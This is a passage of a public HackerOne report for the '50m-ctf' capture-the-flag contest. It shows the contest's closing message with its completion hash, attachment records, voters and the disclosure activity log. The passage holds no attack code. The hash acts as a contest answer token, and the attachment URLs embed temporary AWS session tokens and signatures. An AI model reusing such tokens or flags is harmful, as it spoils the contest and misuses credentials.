https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n```\n\n{F445022}\n\n## Impact\n\n```\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n```","original_report_id":null,"original_report_url":null,"attachments":[{"id":445019,"file_name":"accounting.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/445/019/0106cadc2ee564e2aa710b8f852ecc08af71f0ba/accounting.PNG?response-content-disposition=attachment%3B%20filename%3D%22accounting.PNG%22%3B%20filename%2A%3DUTF-8%27%27accounting.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6d12833182dadb3e5645c6c3efa73ab776bfc5be757ceeea98d258cffbefd807","file_size":24680,"type":"image/png"},{"id":445020,"file_name":"feature.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/445/020/43405a7ccbe7c5b17805cd86e610e403f681c8f0/feature.PNG?response-content-disposition=attachment%3B%20filename%3D%22feature.PNG%22%3B%20filename%2A%3DUTF-8%27%27feature.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=969259323218bf2e18998a1eaa7920383b13be2446c9ec0dc87ab0558ae93434","file_size":84204,"type":"image/png"},{"id":445021,"file_name":"rce1.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/445/021/d83a42800eaa338b4216966f460ecb146a436d1f/rce1.PNG?response-content-disposition=attachment%3B%20filename%3D%22rce1.PNG%22%3B%20filename%2A%3DUTF-8%27%27rce1.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=572c192cd2de913d1ec4cc0648a75367f75ea27b8eac9d22b76007b4e1998fc8","file_size":29418,"type":"image/png"},{"id":445022,"file_name":"solved.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/445/022/54cb02e6267c873df17a0d62a398375973380e54/solved.PNG?response-content-disposition=attachment%3B%20filename%3D%22solved.PNG%22%3B%20filename%2A%3DUTF-8%27%27solved.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0a725e826e86807d4323fa1684fe05b2b30bcf7fd327f6e8a8d049afa882c3c7","file_size":84957,"type":"image/png"},{"id":445023,"file_name":"weasyprint.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/445/023/05401b884c66f92de6c0f68f1d7017b95cc2ab4f/weasyprint.jpg?response-content-disposition=attachment%3B%20filename%3D%22weasyprint.jpg%22%3B%20filename%2A%3DUTF-8%27%27weasyprint.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3ad183708de85a9c3a71c4f6d8abcc9a4398e6c43092dc7f9b8015ae3238e02a","file_size":44324,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2019-05-06T05:37:53.268Z","allow_singular_disclosure_after":-76843830.06911638,"singular_disclosure_allowed":true,"vote_count":21,"voters":["nytr0gen","checkm50","ali","lordjerry0x01","n00bsec","abdilahrf_","arifmkhls","tarwadahorse","c0mmander","ariftotelessss","and 11 more..."],"severity":{"rating":"none","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4492842,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:33:33.877Z","updated_at":"2019-04-05T18:33:33.877Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"abdilahrf_","url":"/abdilahrf_"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4496354,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-06T05:37:53.228Z","updated_at":"2019-04-06T05:37:53.228Z","first_to_agree":true,"actor":{"username":"abdilahrf_","cleared":false,"url":"/abdilahrf_","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/n40ouqrsu00sb54ypc8og89xlvqe/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22Webp.net-resizeimage-min.jpg%22%3B%20filename%2A%3DUTF-8%27%27Webp.net-resizeimage-min.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150823Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1d86f5240ee50e9fce7fbf878695421634e246f204ab35116b8a432b46c91803"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509069,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:53:52.822Z","updated_at":"2019-04-08T15:53:52.822Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509070,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-08T15:53:52.900Z","updated_at":"2019-04-08T15:53:52.900Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}